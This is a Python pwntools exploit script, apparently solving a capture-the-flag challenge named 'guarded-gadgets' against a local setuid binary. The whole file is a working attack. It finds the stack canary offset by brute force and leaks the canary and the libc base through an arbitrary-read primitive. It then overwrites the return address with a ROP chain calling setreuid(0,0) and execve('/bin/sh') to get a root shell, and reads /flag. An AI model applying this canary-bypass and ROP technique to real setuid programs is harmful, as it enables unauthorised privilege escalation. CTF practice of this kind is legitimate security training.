from dataclasses import dataclass
import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def make_non_setuid_binary(bin):
    import shutil

    tmp = f"/tmp/{bin.removeprefix('/challenge/')}"
    shutil.copyfile(bin, tmp)
    pwn.os.chmod(tmp, 0o755)  # remove setuid
    return tmp


@dataclass
class Static:
    offset_canary: int
    libc: pwn.ELF


def find_offset_to_canary(bin):
    for length in range(0x11, 0x101, 0x8):
        io = pwn.process(bin, level="error", aslr=True)
        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
        io.sendline(io.recvuntil(b".", drop=True))
        io.recvuntil(b"[LEAK]")
        io.send(pwn.cyclic(length))
        if b"stack smashing detected" in io.recvrepeat():
            return length - 1
    raise ValueError("failed to find offset")


def one_round(io: pwn.process, static: Static):
    offset_canary = static.offset_canary
    offset_libc_start_main = static.libc.symbols["__libc_start_main"]

    # location of the main(argc, argv) call block in __libc_start_main
    offset_call_main = offset_libc_start_main + 0xAF

    # location of instruction after main returns in __libc_start_main
    offset_ret_main = offset_libc_start_main + 0xF3

    def load_buffer_addr():
        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
        return int(io.recvuntil(b".", drop=True), 16)

    def arbitrary_read(addr: int) -> bytes:
        io.sendlineafter(b"read from:", hex(addr).encode())
        io.recvuntil(b"= ")
        return int(io.recvline(), 16).to_bytes(8, "little")

    tee(io)
    # Stage 1: Leak canary
    buffer_addr = load_buffer_addr()
    canary_addr = buffer_addr + offset_canary
    canary_leak = arbitrary_read(canary_addr)
    pwn.log.info(f"leaked canary: {canary_leak.hex(' ')}")

    io.send(
        pwn.flat(
            {
                offset_canary + 0x00: canary_leak,
                offset_canary + 0x10: (offset_call_main & 0xFF).to_bytes(1, "little"),
            },
        )
    )

    # Stage 2: Leak libc base
    buffer_addr = load_buffer_addr()
    return_addr = canary_addr + 0x10
    return_leak = arbitrary_read(return_addr)  # <__libc_start_main+00f3> mov edi, eax
    libc_base = int.from_bytes(return_leak, "little") - offset_ret_main
    pwn.info(f"leaked libc base: {libc_base:#x}")

    libc = static.libc
    libc.address = libc_base
    rop = pwn.ROP(libc)
    rop.call("setreuid", [0, 0])
    rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])

    # Stage 3: ROP a shell
    io.send(
        pwn.flat(
            {
                offset_canary + 0x00: canary_leak,
                offset_canary + 0x10: rop.chain(),
            },
        )
    )

    io.sendline(b"id; cat /flag; exit")
    if b"pwn" in (out := io.recvrepeat()):
        pwn.success("Found the flag!")
        print(out.decode())


def one_round_debug(bin, static):
    io = pwn.gdb.debug(
        bin,
        gdbscript="""
        source /opt/gef/gef.py
        b *main+769
        b *main+582
        c
        """,
        env={"PADDING": pwn.cyclic(4096)},
        aslr=False,
    )
    with io:
        one_round(io, static)


def one_round_worker(bin, static):
    io = pwn.process(bin, level="error")
    with io:
        one_round(io, static)


def ctf():
    # guarded-gadgets
    root_bin = find_challenge()
    user_bin = make_non_setuid_binary(root_bin)

    offset_canary = find_offset_to_canary(user_bin)
    pwn.success(f"found canary offset: {offset_canary:#x}")

    elf = pwn.ELF(root_bin, checksec=False)
    assert elf.libc

    static = Static(offset_canary, elf.libc)
    if "gdb" in sys.argv:
        # only non-setuid binary can disable ASLR
        one_round_debug(user_bin, static)
        return

    one_round_worker(root_bin, static)


if __name__ == "__main__":
    ctf()
